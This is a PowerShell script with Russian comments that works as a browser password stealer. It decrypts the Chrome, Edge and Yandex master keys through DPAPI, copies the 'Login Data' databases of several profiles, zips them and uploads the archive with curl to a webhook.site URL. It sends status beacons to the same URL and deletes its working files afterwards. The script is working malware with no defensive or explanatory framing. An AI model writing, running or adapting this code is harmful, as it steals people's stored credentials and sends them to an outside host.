# [ Настройки ]
$webhookUrl = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"
$workDir = "$env:TEMP\work_data"
if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
$reportFile = "$workDir\keys.txt"

# Сигнал о начале работы (для диагностики)
& curl.exe -X POST -d "status=started" $webhookUrl

# Функция для сбора данных
function Get-BrowserData($path, $localStatePath, $name) {
    if (Test-Path $localStatePath) {
        try {
            $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($localState.os_crypt.encrypted_key).Length-1)]
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            Add-Content $reportFile "--- $name ---`nMaster Key: $([Convert]::ToBase64String($masterKey))`n"
            
            if (Test-Path $path) {
                Copy-Item $path -Destination "$workDir\$name`_LoginData" -Force
            }
        } catch { 
            Add-Content $reportFile "Error in $name: $_" 
        }
    }
}

# Список путей для проверки
$browsers = @(
    @{n="Chrome"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"};
    @{n="Edge"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"};
    @{n="Yandex"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $base = $b.p
    $name = $b.n
    if (Test-Path $base) {
        # Проверяем Default и Profile 1..5
        $profiles = @("Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5")
        foreach ($p in $profiles) {
            $ld = "$base\$p\Login Data"
            $ls = "$base\Local State"
            if (Test-Path $ld) { Get-BrowserData $ld $ls "$name`_$p" }
        }
    }
}

# Проверка: есть ли что отправлять?
$files = Get-ChildItem $workDir
if ($files.Count -gt 0) {
    $zipFile = "$env:TEMP\logs.zip"
    Compress-Archive -Path "$workDir\*" -DestinationPath $zipFile -Force
    & curl.exe -X POST -F "file=@$zipFile" $webhookUrl
    Remove-Item $zipFile
} else {
    & curl.exe -X POST -d "status=no_data_found" $webhookUrl
}

# Чистка
Remove-Item -Recurse -Force $workDir
